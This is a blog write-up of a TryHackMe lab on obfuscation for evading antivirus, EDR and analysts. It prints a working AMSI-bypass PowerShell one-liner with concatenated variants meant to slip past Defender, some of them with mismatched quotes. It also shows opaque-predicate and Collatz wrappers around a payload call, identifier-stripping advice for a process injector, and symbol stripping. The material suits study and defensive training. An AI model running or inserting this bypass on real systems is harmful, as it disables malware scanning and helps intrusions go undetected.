---
layout: post
title: "Obfuscation Principles "
date: 2025-08-26
categories: [Red Team,Obfuscation,Malware Analysis,Cybersecurity]
image: https://cdn-images-1.medium.com/v2/resize:fit:800/1*3MqLwq_ULUn-MRka-ZspYg.png
---


**Obfuscation** is an essential component of detection evasion methodology and preventing analysis of malicious software. Obfuscation originated to protect software and intellectual property from being stolen or reproduced, while it is still widely used for its original purpose, adversaries have adapted its use for malicious intent.

Learning Objectives:

· Learn how to evade modern detection engineering using tool-agnostic obfuscation

· Understand the principles of obfuscation and its origins from Intellectual property protection

· implement obfuscation methods to hide malicious functions

Before beginning this room familiarize yourself with basic programming logic and syntax. Knowledge of C and PowerShell is recommended but not required.

**Origins of Obfuscation**

Obfuscation is widely software-related fields to protect **IP (Intellectual Property)** and other proprietary information an application may contain.

For example, the popular game: **Minecraft** uses the obfuscator **ProGuard** to obfuscates and minimize its Java classes. Minecraft also releases obfuscation maps with limited information as a translator between the old un-obfuscated classes and the new obfuscated classes to support the modding community.

This is only one example of the wide range of ways obfuscation is publicly used. Ta document and organize the variety of obfuscation methods, we can reference the Layered obfuscation: **a taxonomy of software obfuscation techniques for layered security**. This research paper organizes obfuscation methods by **layers**, similar to the **OSI** model but for application data flow. Below is the figure used as the complete overview of each **taxonomy** layer.

![](https://cdn-images-1.medium.com/max/800/1*2AGu00qXnxCcq3HkqZO73Q.png)

Each sub-layer is then broken down into specific methods that achieve the overall objective of the sub-layer.

In this room, we will focus on the code-element layer of the taxonomy the figure below:

![](https://cdn-images-1.medium.com/max/800/1*f_VnNrRaPzYH1LOijUCkzA.png)

To use the taxonomy we determine an objective and then pick a method that fits our requirements. For example, suppose of our code but cannot modify the existing code, in that case, we can inject junk code, summarized by the taxonomу went to obfuscate the layout:

**Code Element Layer &gt; obfuscating Layout &gt; Junk codes**

**Obfuscation’s Function for Static Evasion**

Two of the more considerable security boundaries in the way of an adversary are **anti-virus engines and EDR (Endpoint Detection &amp; Response) solutions**. Both platforms will leverage an extensive database of known signatures referred to as static signatures as well as heuristic signatures that consider application behavior.

To evade signatures intensive range of logic and syntax rules in implement obfuscation. This is commonly achieved by abusing data obfuscation practices that hide important identifiable information in legitimate applications.

The aforementioned white paper Layered **Obfuscation Taxonomy**, summarizes it well under the **Code-Element layer**. Below is a table of methods covered by the taxonomy in the obfuscating data sub-layer.

Obfuscation Methods:

**Array Transformation**: Transforms an array by splitting, merging, folding, and flattening.

**Data Encoding**: Encodes data with mathematical functions as ciphers.

**Data Procedurization**: Substitutes static data with procedure calls

**Data Splitting/Merging**: Distributes information of one variable into several new variables.

Extending from **concatenation**, attackers can also use non-interpreted characters to disrupt or confuse a static signature. Those can be used independently or with concatenation, depending on the strength/implementation of the signature. Below is a table of some common non-interpreted characters that we can leverage.

![](https://cdn-images-1.medium.com/max/800/1*aZOd0RCWAVqIwstKDkBjYg.png)

Using the knowledge you have accrued throughout this task, obfuscate the following PowerShell snippet until it evades Defender’s detections.

> **Q: \[REF].Assembly.GetType(‘System.Management.Automation.AmsiUtils).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true).**

> **1. \[REF].Assembly.GetType(‘System.Management.Automation.AmsiUtils)&gt;&gt;**

> **\[REF].Assembly.GetType(‘System.Management.Automation.’+’Amsi’+’Utils’)**

> **2. \[REF].Assembly.GetType(‘System.Management.Automation.AmsiUtils).GetField(‘amsiInitFailed’,’NonPublic,Static’) &gt;&gt;**

> **\[REF].Assembly.GetType(‘System.Management.Automation.’+’Amsi’+’Utils’).GetField(‘amsi’+’Init+’Failed’,’NonPublic,Static’)**

> **3. \[REF].Assembly.GetType(‘System.Management.Automation.AmsiUtils).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)&gt;&gt;**

> **$Value=’SetValue’**

> **\[REF].Assembly.GetType(‘System.Management.Automation.’+’Amsi’+’Utils’).GetField(‘amsi’+’Init+’Failed’,’NonPublic,Static’).$Value($null,$true)**

**Obfuscation’s Function for Analysis Deception**

After obfuscating basic functions at malicious code, it may be able to gets software detections but is still susceptible to human analysis, while not a security boundary without further policies, analysts and reverse engineers can gain deep insight into the functionality of our malicious application and halt operations.

![](https://cdn-images-1.medium.com/max/800/1*ujxmuKveIJzws-zOlvzSZg.png)

Adversaries can leverage advanced logic and mathematics to create more complex and harder to understand code to combat analysis and reverse engineering.

**Control Flow:**

What does this mean for attackers? An analyst can attempt to understand a program’s function through its control flow while problematic, Iogic and control flow is almost effortless to manipulate and make arbitrarily confusing. When dealing with control flow, an attacker aims to introduce enough obsecure and arbitrary logic to confuse an analyst but not too much to raise further suspicion or potentially be detected by a platform as malicious.

**Arbitrary Control Flow Pattern**

To craft arbitrary control flow patterns we can leverage maths, logic, and/or other complex algorithms to inject a different control flow into a malicious Function, We can leverage predicates to craft these complex logic and/or mathematical algorithms. Predicates refer to the decision-making of an input function to return true or false. Breaking this concept down at a high level, we can think of a predicate similar to the condition as if statement uses to determine if a code block will be executed or not.

Applying this concept to obfuscation, **opaque predicates** are used to control a known output and input. The paper, **Opaque Predicate: Attack and Defense in Obfuscated Binary Code**, states, “**An opaque predicate is e predicate whose value is known to the obfuscator but is difficult to deduce**. It can be seamlessly applied with other obfuscation methods such as junk code to turn reverse engineering attempts into arduous work. Opaque predicates fall under the bogus control flow and probabilistic control flow methods of the taxonomy paper they can be used to arbitrarily add logic to a program or refactor the control How of a pre-existing function.

**Explanation of Arbitrary Control Flow Patterns and Opaque Predicates**

**Arbitrary Control Flow Patterns** are obfuscation techniques used in programs to make their control flow unpredictable and harder to analyze, especially for reverse engineers or automated tools like antivirus software. These patterns are often crafted using **opaque predicates**, which are decision-making constructs designed to obscure the true logic of a program.

**Opaque Predicates: Core Idea**

An **opaque predicate** is a condition (like an **if** statement) whose outcome is known to the programmer (or **obfuscator**) at **compile-time** but is deliberately made difficult for an analyst to deduce at **runtime**.

For example:

> **if ((x\*x — 2\*x + 1) == 0) {**

> **// Block A**

> **} else {**

> **// Block B**

> **}**

Here:

- The condition (**x\*x — 2\*x + 1)** simplifies to **(x — 1)²**, which always equals **0** when **x = 1.** The obfuscator knows this, but a reverse engineer might spend time figuring out the logic.

**How Arbitrary Control Flow Works**

By combining **opaque predicates** with other techniques, you can modify the program’s control flow in arbitrary ways, making it:

- Seem more complex than it is.
- Include fake or “junk” code paths that will never execute but make the binary harder to analyze.

For instance:

1. Add **fake branching**:

<!--THE END-->

- Insert control-flow paths that appear valid but lead nowhere or loop infinitely in practice.

**2. Predicates with Junk Code**:

- Combine the opaque predicate with unrelated instructions to mislead an analyst.

> **CMP RAX, RAX ; Compare register with itself (always true)**

> **JE valid\_path ; Jump to the real code**

> **invalid\_path:**

> **ADD RAX, 5 ; Fake operations**

> **SUB RAX, 5 ; More fake operations**

> **valid\_path:**

> **; Real code execution**

**3. Transform logical operations into math**:

- Instead of writing:

> **if (x == 1) {**

> **// Do something**

> **}**

Use:

> **if (((x\*x — 2\*x + 1) == 0) || (y\*y &gt; 0)) {**

> **// Complex logic that achieves the same**

> **}**

**Applications in Signature Evasion**

Malware often uses these techniques to:

1. **Confuse Signature-Based Detection**:

<!--THE END-->

- Adding arbitrary patterns to the flow increases variability, making it harder for signature-based scanners to match known patterns.

**2. Defeat Automated Analysis Tools**:

- Tools like decompilers or disassemblers might fail to correctly understand or simplify the complex control flow.

**3. Increase Analyst Workload**:

- Reverse engineers spend more time analyzing junk code and opaque predicates, reducing their efficiency.

**Practical Example**

Consider a malicious function with an injected payload. Instead of a straightforward invocation:

> **if (condition) {**

> **execute\_payload();**

> **}**

Using opaque predicates:

> **if (((x\*x — 2\*x + 1) == 0) &amp;&amp; (y % 2 == 0)) {**

> **// Junk instructions**

> **int z = (y\*y + x) / 3;**

> **z += 42;**

> **// Real payload**

> **execute\_payload();**

> **}**

This obfuscation:

1. Makes it difficult to determine if the **execute\_payload** line is reachable.
2. Adds unnecessary computations (**z**) to mislead analysts or tools.

**The Collatz Conjecture as an Opaque Predicate**

The **Collatz Conjecture** is a famous unsolved problem in mathematics that states:

- Take any positive integer **as n**.
- If n is **even**, divide it by 2: **n=n/2n = n / 2n=n/2.**
- If n is **odd**, multiply it by 3 and add 1: **n=3n+1n = 3n + 1n=3n+1**.
- Repeat the process. The conjecture states that no matter what value of n you start with, you will always eventually reach 1.

This predictable behavior (output of 1 for any positive integer) can be exploited as an **opaque predicate** in obfuscation.

**Example Usage of Collatz in an Opaque Predicate**

In a program, you might use the Collatz sequence to control execution flow:

> **Pseudo-Code Example**

> **int collatz(int n) {**

> **while (n != 1) {**

> **if (n % 2 == 0)**

> **n /= 2; // If even, divide by 2**

> **else**

> **n = 3 * n + 1; // If odd, multiply by 3 and add 1**

> **}**

> **return n;**

> **}**

> **void obfuscated\_function() {**

> **int input = 27; // Example input**

> **if (collatz(input) == 1) {**

> **execute\_payload(); // Execute malicious payload**

> **} else {**

> **fake\_function(); // Redirect to junk code**

> **}**

> **}**

**How This Obfuscates Control Flow**

1. **Opaque Logic**:

<!--THE END-->

- The **collatz()** function always returns 1 for positive integers. However, an analyst might waste time analyzing the logic of the Collatz sequence instead of recognizing that the function is just a constant true predicate.

**2. Junk Control Flow**:

- The **else** branch adds fake or useless code that is never executed, misleading an analyst.

**3. Signature Evasion**:

- Traditional scanners might fail to recognize the signature of the **execute**\_**payload()** function due to the obfuscated and conditional execution.

**Enhancements**

1. **Mix With Junk Code**: Add operations within the **collatz()** loop to further obfuscate the predicate:

> **if (n % 2 == 0) {**

> **n /= 2;**

> **n += 42; // Junk operation**

> **} else {**

> **n = 3 * n + 1;**

> **n ^= 0xDEADBEEF; // Another junk operation**

> **}**

**2. Multiple Branches**: Use intermediate values of the Collatz sequence to create fake branching paths.

**3. Anti-Debugging**: Combine Collatz logic with checks for debugging tools to enhance obfuscation.

**Protecting and Stripping identifiable Information**

Identifiable information can be one of the most critical components an analyst can use to dissect and attempt to understand a malicious program. By limiting the amount of identifiable information (**variables, function names**, etc.), an analyst has, the better chance an attacker has they won’t be able to reconstruct its original function.

At a high level, we should consider three different types of **identifiable data**: **code structure,** **object names, and file/compilation properties**. In this task, we will break down the core concepts of each and a case study of a practical approach to each.

**Object Names**

Object names offer some of the most significant insight into a program’s functionality and can reveal the exact purpose of a function. An analyst can still deconstruct the purpose of a function from its behavior, but this is much harder if there is no context to the function.

The importance of literal object names may change **depending** on if the language is **compiled** or **interpreted**. If an interpreted language such as Python of PowerShell is used, then **all objects matters and must be modified**. If a compiled language such as C or C# is used, **only objects appearing in the strings are generally significant**. An object may appear in the strings by any function that produces an IO operation.

The aforementioned white paper: **Layered Obfuscation Taxonomy**, summarizes these practices well under the **code-element layer’s meaningless identifiers** method.

Below we will observe two basic examples of replacing meaningful identifiers for both an interpreted and compiled language

As an example of a compiled language, we can observe a process injector written in C++ that reports its status to the command line:

![](https://cdn-images-1.medium.com/max/800/1*SfH3rkQpqeRKTs20KcJQhA.png)

Notice that all of the iostream was written to strings, and even the shellcode byte array was leaked. This is a smaller program, so imagine what a fleshed-out and un-obfuscated program would look like!

We can remove the comments and replace the meaningful identifiers to resolve this problem:

![](https://cdn-images-1.medium.com/max/800/1*-VAEcDivuRiUia75pqMpCA.png)

We should no longer have any identifiable string information, and the program is safe from **string** **analysis**.

As an example for interpreted language we can observe the deprecated **Badger Powershell Loader** from the **BRC4 Community Kit.**

[https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger\_template.ps1](https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger_template.ps1)

You may notice that some cmdlets and functions are kept in their original state… why is that? Depending on your objectives, you may want to create an application that can still confuse reverse engineers after detection but may not look immediately suspicious. If a malware developer were to **obfuscate all cmdlets and functions**, it would raise the **entropy in both interpreted and compiled languages resulting in higher CDR alert scores.** It could also lead to an interpreted snippet appearing suspicious in logs if it is seemingly random or visibly heavily obfuscated.

**Code Structure**

Code structure can be a bothersome problem when dealing with all aspects of malicious code that are often overlooked and not easily identified. If not adequately addressed in both interpreted and compiled languages, it can lead to signatures or easier reverse engineering from an analyst.

As covered in the aforementioned taxonomy paper, **junk code and reordering code** are both widely used as additional measures to add complexity to an interpreted program. Because the program is not compiled, an analyst has much greater insight into the program, and if not artificially inflated with complexity, they can focus on the exact malicious functions of an application.

Separation of related code can impact both interpreted and compiled languages and result in hidden signatures that may be hard to identify. A heuristic signature engine may determine whether a program is malicious based on the surrounding functions or API calls. To circumvent these signatures, an attacker can randomize the occurrence of related code to fool the engine into believing it is a sale call or function.

**File &amp; Compilation Properties**

More minor aspects of a compiled binary, such as the compilation method, may not seem like a critical component, but they can lead to several advantages to assist as analyst. For example, if a program is **compiled as a debug build**, an analyst can obtain **all the available global variables and other program information.**

The compiler will include a symbol file when a program is compiled as a **debug** build. **Symbols** commonly aid in debugging a binary image and can contain **global** and **local** variables, **function names**, and **entry points**. Attackers must be aware of these possible problems to ensure proper compilation practices and that no information is leaked to an analyst.

Luckily for attackers, symbol files are easily removed through the compiler or after compilation. To remove symbols from a **compiler like Visual Studio**, we need to change the compilation target from **Debug to Release or** use a lighter weight compiler like **mingw**.

If we need to remove symbols from a pre-compiled image, we can use the command-line utility **strip.**

The `strip` command-line utility is used to remove symbols (like **debug symbols, function names, or other metadata**) from **pre-compiled binary** files. This is often done to reduce the size of an executable or make reverse engineering more challenging.

Here’s an example:

### Example: Using `strip` on an Executable

Assume you have a compiled C program:

```
#include <stdio.h>
int main() {
printf("Hello, World!\n");
return 0;
}
```

1\. Compile the program with debugging symbols:

```
gcc -g -o hello hello.c
```

The `-g` flag includes debugging information in the binary.

2\. Check the size of the binary:

```
ls -lh hello
```

```
Suppose it shows 56K.
```

3\. Use `strip` to remove symbols:

```
strip --strip-all hello
```

1\. · Check the size again:

```
ls -lh hello
```

After stripping, the size might be reduced to `12K`.

### When to Use `strip`

- **Release Builds**: Stripping symbols from production binaries ensures smaller file sizes and avoids exposing sensitive information like function names.
- **Obfuscation**: Removes metadata that could assist reverse engineering.
- **Embedded Systems**: Minimizes the binary size to fit within limited storage.

### Important Note

Stripping a binary can make debugging much harder because the debugging information is removed. Use it carefully and always retain a version of the binary with symbols for internal use.

The aforementioned white paper: **Layered Obfuscation Taxonomy**, summarizes these practices well under the c**ode-element layer’s stripping redundant symbols** method.

#### **Resources**:

[**TryHackMe | Cyber Security Training**  
*TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your…*tryhackme.com](https://tryhackme.com/r/room/obfuscationprinciples "https://tryhackme.com/r/room/obfuscationprinciples")[](https://tryhackme.com/r/room/obfuscationprinciples)

[**Layered obfuscation: a taxonomy of software obfuscation techniques for layered security …**  
*Software obfuscation has been developed for over 30 years. A problem always confusing the communities is what security…*cybersecurity.springeropen.com](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3 "https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3")[](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3)

By [Moataz Osama](https://medium.com/@mezo512) on [January 15, 2025](https://medium.com/p/16b8affb5f74).

[Canonical link](https://medium.com/@mezo512/obfuscation-principles-16b8affb5f74)

Exported from [Medium](https://medium.com) on August 26, 2025.